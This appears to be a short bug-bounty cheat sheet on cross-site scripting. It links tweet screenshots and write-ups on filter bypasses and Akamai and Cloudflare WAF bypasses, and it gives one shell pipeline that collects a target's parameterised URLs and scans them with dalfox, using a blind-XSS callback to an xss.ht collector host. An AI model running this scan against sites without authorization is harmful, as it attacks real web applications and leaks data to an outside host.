<h1 align="center">XSS --> Cross Site Scripting</h1>

<h3>1</h3>
<a href="https://twitter.com/404death/status/1464102960372224003"><img width="550" height="600px" align="center" src="https://user-images.githubusercontent.com/79082257/143777165-68df1dd0-a69a-4fcb-af8e-5fb7c96463f8.png"/></a>

<h3>2</h3>
<a href="https://twitter.com/0xElkomy/status/1467466221704847361"><img width="600" height="700px" align="center" src="https://user-images.githubusercontent.com/79082257/144747863-5c672808-727e-4ac2-a894-ce09966ea765.png"/></a>

Payloads
```
   echo Target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```


https://www.cyberick.com/post/xss-payload-filter-bypass-by-xploiterr

https://infosecwriteups.com/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975


<h3>Akamai WAF bypass</h3> https://twitter.com/xhzeem/status/1377992310974218245


<h3>Cloudflare WAF bypass</h3> https://twitter.com/mamunwhh/status/1494045988016648192
